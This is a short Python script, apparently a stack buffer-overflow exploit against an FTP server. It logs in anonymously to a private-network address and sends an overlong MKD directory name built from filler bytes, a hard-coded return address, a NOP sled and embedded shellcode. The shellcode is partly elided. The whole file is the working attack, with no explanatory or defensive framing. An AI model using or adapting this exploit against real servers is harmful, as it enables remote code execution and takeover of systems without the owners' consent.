import socket
import sys

shellcode = (
    "\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
    "\x56\x86\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27"
    "\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9"
    #..
)
buffer = "\x90"*20 + shellcode
evil = "A"*247 + "\x6a\x34\x3f\x77" + "C"*8 + buffer + "C"*(741-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.227.1', 21))

s.recv(1024)
s.send('USER anonymous\r\n'.encode())
s.recv(1024)
s.send('PASS anonymous\r\n'.encode())
s.recv(1024)
s.send(('MKD ' + evil + '\r\n').encode())
s.recv(1024)
s.send('QUIT\r\n'.encode())
s.close()